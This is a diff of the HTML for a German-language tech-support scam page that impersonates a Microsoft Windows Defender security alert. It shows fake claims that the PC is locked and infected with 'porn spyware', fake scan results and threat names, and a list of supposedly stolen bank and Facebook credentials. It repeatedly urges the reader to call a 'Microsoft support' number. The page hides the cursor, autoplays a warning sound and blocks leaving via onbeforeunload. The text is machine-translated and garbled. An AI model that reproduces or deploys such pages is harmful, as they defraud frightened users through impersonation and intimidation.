#4d90fe;border-radius:0em;-webkit-border-radius:0em;-moz-border-radius:0em;margin:-2px;padding:1px}#goog-gt-tt .gt-trans-highlight-l{border-left:2px solid red;margin-left:-2px}#goog-gt-tt .gt-trans-highlight-r{border-right:2px solid red;margin-right:-2px}#goog-gt-tt #alt-input{padding:2px}#goog-gt-tt #alt-input-text{font-size:11px;padding:2px 2px 3px;margin:0;background-color:#fff;color:#333;border:1px solid #d9d9d9;border-top:1px solid #c0c0c0;display:inline-block;vertical-align:top;height:21px;box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-webkit-border-radius:1px}#goog-gt-tt #alt-input-text:hover{border:1px solid #b9b9b9;border-top:1px solid #a0a0a0;-webkit-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.1);-moz-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.1);box-shadow:inset 0px 1px 2px rgba(0,0,0,0.1)}#goog-gt-tt #alt-input-text:focus{-webkit-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.3);-moz-box-shadow:inset 0px 1px 2px rgba(0,0,0,0.3);box-shadow:inset 0px 1px 2px rgba(0,0,0,0.3);outline:none;border:1px solid #4d90fe}#goog-gt-tt #alt-input-submit{font-size:11px;padding:2px 6px 3px;margin:0 0 0 2px;height:21px}.goog-te-spinner-pos, #goog-gt-tt {display: none;}</style></head>
+
+
+
+<body id="map" onbeforeunload="return myFunction()" style="overflow: hidden; cursor: none; display: block;">
+
+
+
+<div id="chat-box" style="display: block;">
+
+    <img src="microsoft.jpg"><span style="color: #222;
+
+    font-size: 21px;
+
+    font-weight: 600;
+
+    margin-left: 6px;
+
+    position: relative;
+
+    top: 5px;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Microsoft </font></font></span>
+
+    <p style="font-weight: 600;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Support-Kontakt </font></font></p>
+
+    <h4 style="font-weight: 600;">
+
+        <script>document.write(phone_number);</script><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 050-5534-9599 (Freier Anruf )
+
+    </font></font></h4>
+
+    <div class="arrow-down">
+
+        <i class="fa fa-caret-down"></i>
+
+    </div>
 
 </div>
 
-</div>
+
 
 <audio id="beep" autoplay="">
 
-<source src="0wa0rni0ng0.mp3" type="audio/mpeg">
+    <source src="0wa0rni0ng0.mp3" type="audio/mpeg">
 
 </audio>
 
-<div id="delayedPopup" class="delayedPopupWindow lightbox" style="background:red;">
 
-<!-- Dies ist die Schaltfläche zum Schließen -->
 
-<!-- <a href="#" id="btnClose"><i class="fa fa-times" aria-hidden="true"></i></a> -->
+<div id="delayedPopup" class="delayedPopupWindow lightbox" style="background: red; display: block;">
 
-<div class="row firewall-pro">
+    <!-- This is the close button -->
 
-<div class="col-md-12">
+    <!-- <a href="#" id="btnClose"><i class="fa fa-times" aria-hidden="true"></i></a> -->
 
-<div class="green-box" style="-webkit-box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0,5); 
 
--moz-box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0,5); 
 
-Boxschatten: 0px 0px 15px 0px rgba(50, 50, 50, 0,5); Rand: 1px fest #aaa;"> 
+    <div class="row firewall-pro">
 
-<div class="row"> 
+        <div class="col-md-12">
 
-<div class="col-md-8"> 
+            <div class="green-box" style="-webkit-box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0.5);
 
-<div class="logo_micro" style="float: left; 
+    -moz-box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0.5);
 
-margin-left: 10px;"> 
+    box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0.5);    border: 1px solid #aaa;">
 
-<img src="microsoft.jpg"><span style="color: #000;">Windows-Betriebssystem</span> 
+                <div class="row">
 
-</div> 
+                    <div class="col-md-8">
 
-</div> 
+                        <div class="logo_micro" style="float: left;
 
-<div class="col-md-4">
+    margin-left: 10px;">
 
-<div class="minimize">
+                            <img src="microsoft.jpg"><span style="color: #000;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows Firewall-Schutz </font></font></span>
 
-<ul>
+                        </div>
 
-<li style="cursor: pointer;"><img src="cut.png" style="width: 12px;"></li>
+                    </div>
 
-<li style="cursor: pointer;"><img src="minus.png" style="width: 12px;"></li>
+                    <div class="col-md-4">
 
-</ul>
+                        <div class="minimize">
+
+                            <ul>
+
+                                <li style="cursor: pointer;"><img src="cut.png" style="width: 12px;"></li>
+
+                                <li style="cursor: pointer;"><img src="minus.png" style="width: 12px;"></li>
+
+                            </ul>
+
+                        </div>
+
+                    </div>
+
+
+
+                </div>
+
+
+
+            </div>
+
+        </div>
+
+        <div class="col-md-4">
+
+            <div class="microsoft-logo">
+
+                <img src="microsoft.jpg"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Microsoft </font></font></span>
+
+            </div>
+
+        </div>
+
+        <div class="col-md-8">
+
+            <div class="formDescription">
+
+                <h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Porno Warning-Eller-Code: # 0x268d3 ( x7 )
+</font></font></h2>
+
+                <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Der Zugriff auf diesen PC ist aus Sicherheitsgründen gesperrt
+</font></font></p>
+
+                <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Wenden Sie sich an Windows Support
+
+
+                    </font></font><script>document.write(phone_number2);</script><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 050-5534-9599
+
+                </font></font></p>
+
+
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- This is the left side of the popup for the description -->
+
+    <footer id="footer">
+
+        <div class="row">
+
+            <div class="col-md-6 left-code">
+
+                <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Bedrohung durch Spyware mit erkannten Pornos
+</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+
+                    App: Ads.financetrack ( 1 ) .exe </font></font></p>
+
+            </div>
+
+            <div class="col-md-6">
+
+                <div class="button_new" id="footer_btn">
+
+                    <a href="#" class="safe"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Lauf trotzdem
+</font></font></a>
+
+                    <a href="#" class="anyway blink"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Zurück in Sicherheit
+</font></font></a>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </footer>
+
+    <!-- End MailChimp Signup Form -->
 
 </div>
 
-</div>
+
+
+<div class="alert_popup cardcontainer lightbox" style="cursor: none; display: block;">
+
+    <div class="container">
+
+        <div class="row">
+
+            <div class="col-md-12">
+
+                <p class="text-center" style="    font-size: 16px;
+
+    font-weight: normal;
+
+    margin: 0;
+
+    margin-bottom: 5px;
+
+    padding: 5px 10px;
+
+    color: #414141;font-weight: bold;
+
+    margin-top: 8px;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows_Defender-Sicherheitswarnung
+</font></font></p>
+
+                <p class="text-center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ** Der Zugriff auf diesen PC ist aus Sicherheitsgründen gesperrt
+ ** </font></font></p>
+
+                <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Ihr Computer warnt Sie, dass Sie mit Porno-Spyware infiziert sind. Die folgenden Daten wurden kompromittiert
+ . </font></font></p>
+
+                <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; Informationen zur E-Mail-Zertifizierung
+</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+
+                    &gt; Bankkennwort
+</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+
+                    &gt; Facebook Login
+</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+
+                    &gt; Bild
+ &amp;Dokument
+
+
+
+
+                </font></font></p>
+
+                <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows Defender Scan hat potenziell unerwünschte Adware auf diesem Gerät erkannt, mit der Kennwörter, Online-IDs, Finanzinformationen, persönliche Dateien, Fotos oder Dokumente gestohlen werden können
+ . </font></font></p>
+
+                <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Bitte kontaktieren Sie uns sofort, damit der Ingenieur den Entfernungsprozess Schritt für Schritt erläutern kann.
+ 
+                     Telefon. </font></font></p>
+
+                <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Wenden Sie sich sofort an den Microsoft-Support, um diese Bedrohung zu melden, Identitätsdiebstahl zu verhindern und den Zugriff freizuschalten.
+ 
+                     Dieses Gerät. </font></font></p>
+
+                <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Wenn Sie dieses Fenster schließen, sind Ihre persönlichen Daten gefährdet und der Zugriff wird gestoppt.
+ 
+                     Windows. </font></font></p>
+
+                <p style="padding-bottom: 0px;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Rufen Sie den Microsoft-Support auf
+ :  </font><strong><font style="vertical-align: inherit;"> 050-5534-9599 (Freier Anruf )
+
+                    </font></strong></font><strong>
+
+                        <script>document.write(phone_number);</script><font style="vertical-align: inherit;"></font></strong></p>
+
+                <div class="action_buttons"><a class="active" id="leave_page" style="cursor: pointer;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> OK </font></font></a> <a class="active" id="leave_page"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Stornieren </font></font></a></div>
+
+            </div>
+
+
+
+        </div>
+
+    </div>
 
 </div>
 
-</div>
 
-</div>
 
-<div class="col-md-4">
 
-<div class="microsoft-logo">
-
-<img src="microsoft.jpg"><span>Microsoft</span>
-
-</div>
-
-</div>
-
-<div class="col-md-8">
-
-<div class="formDescription">
-
-<h2>Klicken Sie hier, um mehr zu erfahren - Code: #0x268d3(x7)
-</h2> 
-
-<p>Für PC und PC
-</p> 
-
-<p>Windows-Benutzeroberfläche 
-
-
-<script>document.write(phone_number2);</script> 
-
-</p> 
-
-
-
-</div> 
-
-</div> 
-
-</div> 
-
-<!-- Dies ist die linke Seite des Popups für die Beschreibung -> 
-
-<footer id="footer"> 
-
-<div class="row"> 
-
-<div class="col-md-6 left-code"> 
-
-<p>検出された脅威 - ポルノ スパイウェア
-<br> 
-
-App: Ads.financetrack(1).exe</p> 
-
-</div> 
-
-<div class="col-md-6"> 
-
-<div class="button_new" id="footer_btn"> 
-
-<a href="#" class="safe">Zur Sicherheit
-</a> 
-
-<a href="#" class="anyway blink">安全に戻る
-</a> 
-
-</div> 
-
-</div> 
-
-</div>
-
-</footer>
-
-<!-- MailChimp-Anmeldeformular beenden -->
-
-</div>
-
-<div class="alert_popup cardcontainer lightbox" style="cursor: none;">
-
-<div class="container">
-
-<div class="row">
-
-<div class
-s="col-md-12">
-
-<p class="text-center" style=" font-size: 16px;
-
-font-weight: normal;
-
-margin: 0;
-
-margin-bottom: 5px;
-
-padding: 5px 10px;
-
-color: #414141;font-weight: bold;
-
-margin-top: 8px;">Windows_Defender – Sicherheitswarnung
-</p>
-
-<p class="text-center">** Der Zugriff auf diesen PC wurde aus Sicherheitsgründen gesperrt.
-**</p>
-
-<p>Ihr Computer hat Sie gewarnt, dass er mit pornografischer Spyware infiziert ist. Folgende Daten wurden kompromittiert:
-
-.</p>
-
-<p>&gt; E-Mail-Anmeldedaten
-<br>
-
-&gt; Bankkennwörter
-<br>
-
-&gt; Facebook-Login
-<br>
-
-&gt; Bilder
-&amp; Dokumente
-
-</p>
-
-<p>Der Windows Defender-Scan hat auf diesem Gerät potenziell unerwünschte Adware erkannt, die Ihre Passwörter, Online-Identitäten, Finanzinformationen, persönlichen Dateien, Fotos oder Dokumente stehlen könnte.
-
-</p>
-
-<p>Kontaktieren Sie uns umgehend, damit ein Techniker Sie durch den Entfernungsprozess führen kann.
-
-Telefon.
-
-<p>Kontaktieren Sie umgehend den Microsoft-Support, um diese Bedrohung zu melden, Identitätsdiebstahl zu verhindern und den Zugriff auf dieses Gerät freizugeben.
-
-</p>
-
-<p>Durch Schließen dieses Fensters verhindern Sie, dass Ihre persönlichen Daten kompromittiert werden, und der Zugriff wird gesperrt.
-
-Windows-Registrierung.</p>
-
-<p style="padding-bottom: 0px;">Microsoft-Support anrufen
-: <strong>
-
-<script>document.write(phone_number);</script>
-
-</strong></p>
-
-<div class="action_buttons"><a class="active" id="leave_page" style="cursor: pointer;">OK</a> <a
-
-class="active" id="leave_page">Abbrechen</a></div>
-
-</div>
-
-</div>
-
-</div>
 
 <div class="bg">
 
-<!-- <div class="logo"><img src="5f205bb7e57b5_v.png" alt="Norton™" /></div> -->
+    <!-- <div class="logo"><img src="5f205bb7e57b5_v.png" alt="Norton™" /></div> -->
 
-<!-- <div class="menu" id="menu">PRODUKTE & SERVICES INTERNET-SICHERHEITSZENTRUM SUPPORT KOSTENLOSE TESTVERSIONEN ANMELDEN</div> -->
+    <!-- <div class="menu" id="menu">PRODUCTS & SERVICES &nbsp;&nbsp;&nbsp; INTERNET SECURITY CENTER &nbsp;&nbsp;&nbsp; SUPPORT &nbsp;&nbsp;&nbsp; FREE TRIALS &nbsp;&nbsp;&nbsp; SIGN IN</div> -->
 
-<div class="bgimg" style="top: 0px;"><img src="background-2.png" alt="" width="100%"/></div>
+    <div class="bgimg" style="top: 0px;"><img src="background-2.png" alt="" width="100%"></div>
 
-<div class="text">
+    <div class="text">
 
-<!-- <span id="head1">Windows hat einen bösartigen Virus auf Ihrem System erkannt</span>
+        <!--   <span id="head1">Windows Has Detected a Malicious Virus On Your System</span>
 
-<span style="font-size: 30px; color: #000;font-weight: 600;" id="head2">Kontaktieren Sie unsere zertifizierten Windows-Techniker für sofortige Hilfe</span>
+          <span style="font-size: 30px; color: #000;font-weight: 600;" id="head2">Contact Our Certified Windows Technicians For Immediate Assistance</span>
 
-<span style="font-size: 30px;color: #000;font-weight: 600;"><script>document.write(phone_number);</script></span> -->
+        <span style="font-size: 30px;color: #000;font-weight: 600;"><script>document.write(phone_number);</script></span> -->
 
-</div>
+    </div>
 
 </div>
 
 <!-- <div class="bottom">
 
-<div class="logo"><img src="5f205bb933ceb_v.png" alt="Norton™" /></div>
+    <div class="logo"><img src="5f205bb933ceb_v.png" alt="Norton™" /></div>
 
-<div class="copyright">© 2020 NortonLifeLock Inc. <strong style="color: #1ce783;"> Beispielscanner und Affiliate-Werbung.</strong></div>
+    <div class="copyright">© 2020 NortonLifeLock Inc. <strong style="color: #1ce783;"> sample scanner and an affiliate advertisment.</strong></div>
 
-<div class="line1"></div>
+    <div class="line1"></div>
 
-<div class="menu" id="menu_b">Rechtliche Hinweise | Lizenzvereinbarung | Datenschutzrichtlinie | Karriere | Cookies | Sitemap | Systemstatus | Agentenanzeige</div>
+    <div class="menu" id="menu_b">Legal Notice | License Agreement | Privacy Policy | Careers | Cookies | Site Map | System Status | Agent Viewer</div>
 
-<div class="line2"></div>
+    <div class="line2"></div>
 
-<div class="text">Sparen Sie bis zu 50 % auf Norton 360 im ersten Jahr*</div>
+    <div class="text">Save up to 50% on Norton 360 for first year*</div>
 
 </div> -->
 
 <a href="#" rel="noreferrer" style="cursor: none;" id="link_black">
 
-<div class="black" style="height: 145%;"></div>
+    <div class="black" style="height: 145%;"></div>
 
 </a>
 
 <div class="win1" style="cursor: none;">
 
-<div class="header">
+    <div class="header">
 
-<img src="microsoft.png" class="ico"/>
+        <img src="microsoft.png" class="ico">
 
-<div class="name">Microsoft-Windows-Defender-Warnung
-050-5534-9599 (gebührenfrei)....</div>
+        <div class="name"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Microsoft-Windows-Defender-Warnung
+  050-5534-9599 (Kostenloser Anruf ) ... </font></font></div>
 
-<img src="5f205bba58587_v.png" class="win_min"/> <img src="5f205bbe46967_v.png" class="win_cls"/>
+        <img src="5f205bba58587_v.png" class="win_min"> <img src="5f205bbe46967_v.png" class="win_cls">
 
-</div>
+    </div>
 
-<div class="gray_line">
+    <div class="gray_line">
 
-<img src="5f205bbdae210_v.png" class="ico_gray1" id="w1_ico1"/>
+        <img src="5f205bbdae210_v.png" class="ico_gray1" id="w1_ico1">
 
-<div class="set" id="w1_1">Einstellungen</div>
+        <div class="set" id="w1_1"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Einstellungen </font></font></div>
 
-<img src="5f205bbae3ed9_v.png" class="ico_gray2" id="w1_ico2"/>
+        <img src="5f205bbae3ed9_v.png" class="ico_gray2" id="w1_ico2">
 
-<div class="help" id="w1_2">Hilfe</div>
+        <div class="help" id="w1_2"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Hilfe </font></font></div>
 
-</div>
+    </div>
 
-<div class="white_line">
+    <div class="white_line">
 
-<img src="5f205bb9bf55a_v.gif" class="pc"/>
+        <img src="5f205bb9bf55a_v.gif" class="pc">
 
-<div class="txt1" id="w1_3">Geschützt</div>
+        <div class="txt1" id="w1_3"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Geschützt </font></font></div>
 
-<div class="txt2">
+        <div class="txt2">
 
-<span id="w1_4">Schutz-Update: </span><span style="color: #23a31c;" id="w1_5">Aktuell</span><br/>
+            <span id="w1_4"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Schutzaktualisierung:  </font></font></span><span style="color: #23a31c;" id="w1_5"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Aktuell </font></font></span><br>
 
-<span id="w1_6">Letzter Scan: </span><span style="color: #c00;" id="w1_7">Nicht verfügbar</span> <span
+            <span id="w1_6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Letzter Scan:  </font></font></span><span style="color: #c00;" id="w1_7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Nicht verfügbar </font></font></span> <span style="color: #2ea8e5;" id="w1_8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> | Schnellscan </font></font></span><br>
 
-style="color: #2ea8e5;" id="w1_8">| Schnellscan</span><br/>
+            <span id="w1_9"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Lizenz verwendet:  </font></font></span><span style="color: #23a31c;" id="w1_10"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 1 von 5 </font></font></span> <span style="color: #2ea8e5;" id="w1_11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> | Auf einem anderen Gerät installieren </font></font></span>
 
-<span id="w1_9">Nutzungslizenz: </span><span style="color: #23a31c;" id="w1_10">1 von 5</span> <span
+        </div>
 
-style="color: #2ea8e5;" id="w1_11">| Auf einem anderen Gerät installieren</span>
+    </div>
 
-</div>
+    <div class="green_line"><img src="5f205bbb6fc7d_v.gif" class="corner"></div>
 
-</div>
+    <div class="bl1">
 
-<div class="green_line"><img src="5f205bbb6fc7d_v.gif" class="corner"/></div>
+        <div class="txt1" id="w1_12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Sicherheit </font></font></div>
 
-<div class="bl1">
+        <img src="5f205bbbf25aa_v.gif" class="ico">
 
-<div class="txt1" id="w1_12">Sicher</div>
+        <div class="txt2" id="w1_13" style="color: red"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Ungültig </font></font></div>
 
-<img src="5f205bbbf25aa_v.gif" class="ico"/>
+        <div class="line"></div>
 
-<div class="txt2" id="w1_13" style="color: red">Deaktiviert</div>
+    </div>
 
-<div class="line"></div>
+    <div class="bl2">
 
-</div>
+        <div class="txt1" id="w1_14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Identität </font></font></div>
 
-<div class="bl2">
+        <img src="5f205bbc8a6e3_v.gif" class="ico">
 
-<div class="txt1" id="w1_14">Identität</div>
+        <div class="txt2" id="w1_13a" style="color: red"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> In Gefahr </font></font></div>
 
-<img src="5f205bbc8a6e3_v.gif" class="ico"/>
+        <div class="line"></div>
 
-<div class="txt2" id="w1_13a" style="color: red">Gefährdet</div>
+    </div>
 
-<div class="line"></div>
+    <div class="bl3">
 
-</div>
+        <div class="txt1" id="w1_15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Leistung </font></font></div>
 
-<div class="bl3">
+        <img src="5f205bc00090f_v.gif" class="ico">
 
-<div class="txt1" id="w1_15">Leistung</div>
+        <div class="txt2" id="w1_13b"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Optimierung </font></font></div>
 
-<img src="5f205bc00090f_v.gif" class="ico"/>
+        <div class="line"></div>
 
-<div class="txt2" id="w1_13b">Optimierung</div>
-div>
+    </div>
 
-<div class="line"></div>
+    <div class="bl4">
 
-</div>
+        <div class="txt1" id="w1_16" style="font-size: 20px;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Firewall </font></font></div>
 
-<div class="bl4">
+        <img src="microsoft.png" class="ico" style="width: 52px;margin-top: 27px;">
 
-<div class="txt1" id="w1_16" style="font-size: 20px;">Firewall</div>
+        <div class="txt2" id="w1_13c"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> aus </font></font></div>
 
-<img src="microsoft.png" class="ico" style="width: 52px;margin-top: 27px;"/>
+    </div>
 
-<div class="txt2" id="w1_13c">Aus</div>
+    <div class="gray_line2">
 
-</div>
+        <div class="txt"><span id="w1_17"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Beginnt:  </font></font></span><span class="gr" id="w1_18" style="color: red;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Ihr Computer ist gefährdet! </font></font></span>
 
-<div class="gray_line2">
+        </div>
 
-<div class="txt"><span id="w1_17">Status: </span><span class="gr" id="w1_18" style="color: red;">Ihr Computer ist gefährdet! </span>
-
-</div>
+    </div>
 
 </div>
 
-</div>
+<div class="win2" id="win2" style="display: block; cursor: none;">
 
-<div class="win2" id="win2" style="display: none;cursor: none;">
+    <div class="header">
 
-<div class="header">
+        <div class="name" id="w2_1"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Schneller Scan </font></font></div>
 
-<div class="name" id="w2_1">Schnellscan</div>
+        <img src="5f205bba58587_v.png" class="win_min"> <img src="5f205bbe46967_v.png" class="win_cls">
 
-<img src="5f205bba58587_v.png" class="win_min"/> <img src="5f205bbe46967_v.png" class="win_cls"/>
+    </div>
 
-</div>
+    <div class="line_orange">
 
-<div class="line_orange">
+        <img src="5f205bbece31e_v.gif" class="ring">
 
-<img src="5f205bbece31e_v.gif" class="ring"/>
+        <div class="header" id="w2_2"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Arbeit </font></font></div>
 
-<div class="header" id="w2_2">Arbeit</div>
+        <div class="txt1" id="w2_3"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Gut infizierte Bereiche scannen und Dateien starten ... </font></font></div>
 
-<div class="txt1" id="w2_3">Scannen gemeinsam genutzter Bereiche und Start Dateien...</div>
+        <div class="txt2" id="path1"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> C: ProgrammdateienWindows DefenderMSASCuiL.exe </font></font></div>
 
-<div class="txt2" id="path1">C:\Windows\System32\sihost.exe</div>
+        <div class="anim" style="background: url('./img/anim_orange.gif');"></div>
 
-<div class="anim" style="background: url('./img/anim_orange.gif');"></div>
+    </div>
 
-</div>
+    <div class="line_red" style="display: block;" id="win2_line_red">
 
-<div class="line_red" style="display: none;" id="win2_line_red">
+        <img src="5f205bbf6a050_v.gif" class="ring">
 
-<img src="5f205bbf6a050_v.gif" class="ring"/>
+        <div class="header" id="w2_4"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Erledigt </font></font></div>
 
-<div class="header" id="w2_4">Wird ausgeführt</div>
+        <div class="txt1" id="w2_5"></div>
 
-<div class="txt1" id="w2_5">
-Gemeinsame Bereiche und Startdateien werden gescannt...</div>
+        <div class="txt2" id="path2"></div>
 
-<div class="txt2" id="path2">C:\Programme\Windows Defender\MSASCuiL.exe</div>
+        <div class="anim" style="background: url('./img/anim_red.gif');"></div>
 
-<div class="anim" style="background: url('./img/anim_red.gif');"></div>
+    </div>
 
-</div>
+    <div class="tab">
 
-<div class="tab">
+        <div class="line1" id="w2_6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Ergebniszusammenfassung </font></font></div>
 
-<div class="line1" id="w2_6">Ergebnisübersicht</div>
+        <div class="line2" id="w2_7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> [+] Gesamtzahl der gescannten Gegenstände: </font></font></div>
 
-<div class="line2" id="w2_7">[+] Gesamtzahl der gescannten Elemente:</div>
+        <div class="line3" id="w2_8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> [+] Insgesamt festgestellte Sicherheitsrisiken: </font></font></div>
 
-<div class="line3" id="w2_8">[+] Gesamtzahl der erkannten Sicherheitsrisiken:</div>
+        <div class="line4" id="w2_9"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> [+] Sicherheitsrisiko gelöst mit insgesamt: </font></font></div>
 
-<div class="line4" id="w2_9">[+] Gesamtzahl der behobenen Sicherheitsrisiken:</div>
+        <div class="line5" id="w2_10"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Umfassende Sicherheitsrisiken, die berücksichtigt werden müssen: </font></font></div>
 
-<div class="line5" id="w2_10">Gesamtzahl der zu behebenden Sicherheitsrisiken:</div>
+        <div class="line6"></div>
 
-<div class="line6"></div>
+        <div class="digit1" id="cnt1"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 2038 </font></font></div>
 
-<div class="digit1" id="cnt1">143</div>
+        <div class="digit2" id="cnt2" style="color: rgb(221, 0, 0);"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 80 </font></font></div>
 
-<div class="digit2" id="cnt2">0</div>
+        <div class="digit3"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 0 </font></font></div>
 
-<div class="digit3">0</div>
+        <div class="digit4" id="cnt4" style="color: rgb(221, 0, 0);"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 80 </font></font></div>
 
-<div class="digit4" id="cnt4">0</div>
+    </div>
 
-</div>
+    <img src="microsoft.png" class="nrt_logo"><span class="mask2"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Microsoft </font></font></span>
 
-<img src="microsoft.png" class="nrt_logo"/><span class="mask2">Microsoft</span>
+    <div class="btn1" id="w2_11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Pause </font></font></div>
 
-<div class="btn1" id="w2_11">Pause</div>
-
-<div class="btn2" id="w2_12">Stopp</div>
+    <div class="btn2" id="w2_12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> anhalten </font></font></div>
 
 </div>
 
 <a href="#" rel="noreferrer" style="cursor: none;"> </a>
 
-<div id="vir1">
 
-<div id="vir_tray">
 
-<div class="line_red">
+<div id="vir1" style="bottom: 440px; opacity: 0;">
 
-<span id="w4_1"><b>Bedrohung gefunden!</b></span><br/>
+    <div id="vir_tray">
 
-Win32/Hoax.Renos.HX
+        <div class="line_red">
 
-</div>
+            <span id="w4_1"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Entdecken Sie die Bedrohung! </font></font></b></span><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 
-<img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
+            Win32 / Hoax.Renos.HX
 
-<div class="txt1" id="w4_2">
-Hohes Risiko</div>
+        </font></font></div>
 
-<img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
+        <img src="5f205bc1a74d5_v.gif" class="ico_tray1">
 
-<div class="txt2">
+        <div class="txt1" id="w4_2"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+Hohes Risiko </font></font></div>
 
-<span id="w4_4"><b>Original</b></span><br/>
+        <img src="5f205bc2379ac_v.gif" class="ico_tray2">
 
-<span id="w4_5">Nicht verfügbar</span>
+        <div class="txt2">
 
-</div>
+            <span id="w4_4"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Original </font></font></b></span><br>
 
-<img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
+            <span id="w4_5"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Nicht verfügbar </font></font></span>
 
-<div class="txt3">
+        </div>
 
-<span id="w4_6"><b>Aktivität</b></span><br/>
+        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3">
 
-<span id="w4_7">Ergriffene Bedrohungsmaßnahmen: 1</span>
+        <div class="txt3">
 
-</div>
+            <span id="w4_6"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Aktivität </font></font></b></span><br>
 
-</div>
+            <span id="w4_7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Bedrohungsmaßnahmen ergriffen: 1 </font></font></span>
 
-</div>
+        </div>
 
-<div id="vir2">
-
-<div id="vir_tray">
-
-<div class="line_red">
-
-<span id="w4_1a"><b>
-Bedrohung gefunden!</b></span><br/>
-
-Trojaner IRC/Backdor.Sd.FRV
+    </div>
 
 </div>
 
-<img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
+<div id="vir2" style="bottom: 440px; opacity: 0;">
 
-<div class="txt1" id="w4_2a">Hohes Risiko</div>
+    <div id="vir_tray">
 
-<img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
+        <div class="line_red">
 
-<div class="txt2">
+            <span id="w4_1a"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+Entdecken Sie die Bedrohung! </font></font></b></span><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 
-<span id="w4_4a"><b>Original</b></span><br/>
+            Trojaner IRC / Backdor.Sd.FRV
 
-<span id="w4_5a">Nicht verfügbar</span>
+        </font></font></div>
 
-</div>
+        <img src="5f205bc1a74d5_v.gif" class="ico_tray1">
